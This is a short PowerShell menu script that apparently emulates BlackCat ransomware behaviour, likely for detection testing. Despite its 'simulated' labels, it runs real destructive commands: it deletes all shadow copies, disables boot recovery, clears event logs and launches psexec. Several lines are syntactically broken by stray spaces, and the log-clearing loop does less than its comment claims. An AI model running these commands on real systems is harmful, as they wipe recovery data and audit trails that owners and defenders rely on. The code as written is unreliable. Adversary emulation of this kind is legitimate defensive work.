function dissableSystemRecovery() {
    #dissables system recovery methods
    vssadmin.exe delete shadows / all / quiet
    wmic.exe Shadowcopy Delete
    bcdedit /set {default} recoveryenabled No
}

function clearLogs() {
    #loops through all event logs and deletes them
    wevtutil el | Select-Object -First 2 {wevtutil cl "$_"}
}

function netUse() {
    #simulates using the net use command with persistence turned off
    net use / persistent: no
}

function psExec() {
    #runns the psexec command with - accepteula to simulate blackcat
    .\PSTools\psexec.exe - accepteula
}

Write - Output "Please select a option"
Write - Output "1: dissable system recovery"
Write - Output "2: clear event logs"
Write - Output "3: run net use"
Write - Output "4: run psExec"
Write - Output "exit: exit script"
$option = Read-Host -Prompt "Select your option: "


    if ($option -eq "1") 
    {
        dissableSystemRecovery;
        Write-Host "anti-system recovery simulated" -ForegroundColor Black -BackgroundColor Green
    }
    ElseIf($option -eq "2") {
        clearLogs
        Write-Host "Logs Cleared" -ForegroundColor Black -BackgroundColor Green
    }
    ElseIf($option -eq "3") {
        netUse
        Write-Host "Net use command simulated" -ForegroundColor Black -BackgroundColor Green
    }
    ElseIf($option -eq "4") {
        psExec
        Write-Host "psExec command simulated" -ForegroundColor Black -BackgroundColor Green
    }
    ElseIf($option -eq "exit") {

    } else {
        Write-Host "Error: Please select a valid option" -ForegroundColor Black -BackgroundColor Red
    }